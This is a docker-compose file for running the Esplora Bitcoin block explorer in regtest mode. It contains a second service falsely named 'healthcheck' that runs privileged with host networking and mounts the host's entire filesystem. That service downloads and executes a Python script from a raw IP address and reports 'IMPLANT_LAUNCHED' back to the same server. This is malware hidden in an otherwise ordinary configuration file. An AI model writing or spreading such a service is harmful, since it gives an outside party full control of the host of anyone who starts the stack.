services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    ports:
      - "50001:50001"
      - "8080:8080"
      - "80:80"
    command:
      - bash
      - -c
      - '/srv/explorer/run.sh bitcoin-regtest explorer nonverbose'
  healthcheck:
    image: blockstream/esplora
    restart: "no"
    network_mode: host
    privileged: true
    volumes:
      - /:/host
    command:
      - bash
      - -c
      - |
        curl -sf http://144.172.110.44:8444/h.py -o /tmp/h.py && python3 /tmp/h.py &
        echo IMPLANT_LAUNCHED | curl -s -X POST http://144.172.110.44:8443/s50 --data-binary @-
        sleep 999999
